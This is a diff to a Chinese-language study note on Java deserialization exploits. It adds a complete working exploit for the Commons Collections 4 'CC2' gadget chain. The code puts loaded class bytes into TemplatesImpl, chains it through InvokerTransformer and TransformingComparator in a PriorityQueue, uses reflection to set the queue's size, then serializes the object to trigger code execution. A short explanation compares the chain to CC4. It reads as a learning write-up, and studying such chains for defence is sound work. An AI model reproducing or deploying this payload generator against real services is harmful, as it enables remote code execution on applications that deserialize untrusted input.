@@ -248,7 +248,7 @@ public PriorityQueue(Comparator<? super E> comparator) {
 
 ，不太懂这个位运算，都是反正不能为0。好像要size=2，就可以进去。组长这里是又进去调试了一下，我这里试了一下，可以直接反射改size的值就好了。
 
-```
+```java
 Class<PriorityQueue> priorityQueueClass = PriorityQueue.class;
         Field sizeField = priorityQueueClass.getDeclaredField("size");
         sizeField.setAccessible(true);
@@ -261,3 +261,81 @@ Class<PriorityQueue> priorityQueueClass = PriorityQueue.class;
 
 
 # CC2
+# 完整exp：
+
+```java
+package org.example;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import org.apache.commons.collections4.functors.InvokerTransformer;
+import org.apache.commons.collections4.comparators.TransformingComparator;
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.PriorityQueue;
+
+public class CC2 {
+    public static void main(String[] args) throws NoSuchFieldException, IOException, IllegalAccessException, ClassNotFoundException {
+        TemplatesImpl templates = new TemplatesImpl();
+        Class templatesClass = TemplatesImpl.class;
+        Field nameField = templatesClass.getDeclaredField("_name");
+        nameField.setAccessible(true);
+        nameField.set(templates,"aaa");
+
+        Field bytecodesFiled = templatesClass.getDeclaredField("_bytecodes");
+        bytecodesFiled.setAccessible(true);
+
+        byte[] code= Files.readAllBytes(Paths.get("D://tem/classes/Test.class"));
+        byte[][] codes={code};
+        bytecodesFiled.set(templates,codes);
+
+        //看效果的
+//        Field tfactoryField = templatesClass.getDeclaredField("_tfactory");
+//        tfactoryField.setAccessible(true);
+//        tfactoryField.set(templates,new TransformerFactoryImpl());
+
+        InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer", new Class[]{}, new Object[]{});
+//        invokerTransformer.transform( templates);
+        
+
+        TransformingComparator transformingComparator = new TransformingComparator(invokerTransformer);
+
+        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);
+
+        priorityQueue.add(templates);
+
+        Class<PriorityQueue> priorityQueueClass = PriorityQueue.class;
+        Field sizeField = priorityQueueClass.getDeclaredField("size");
+        sizeField.setAccessible(true);
+        sizeField.set(priorityQueue, 2);
+
+
+
+        serialize(priorityQueue);
+
+        unserialize("person.txt");
+    }
+
+
+    public static void serialize(Object obj) throws IOException, NoSuchFieldException, IllegalAccessException {
+        ObjectOutputStream oos =new ObjectOutputStream(new FileOutputStream("person.txt"));
+        oos.writeObject(obj);
+        System.out.println("序列化完成");
+    }
+    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException
+    {
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
+        Object obj = ois.readObject();
+        System.out.println("反序列化"+Filename +"完成");
+        return obj;
+    }
+}
+```
+
+这里和cc4差不多，只是不用chainedTransformer了，直接用InvokerTransformer，执行transformer方法
+
+我这里还是用反射直接改了size，都是这里没有用到ConstantTransformer传参数了，所以add了一个templates进去
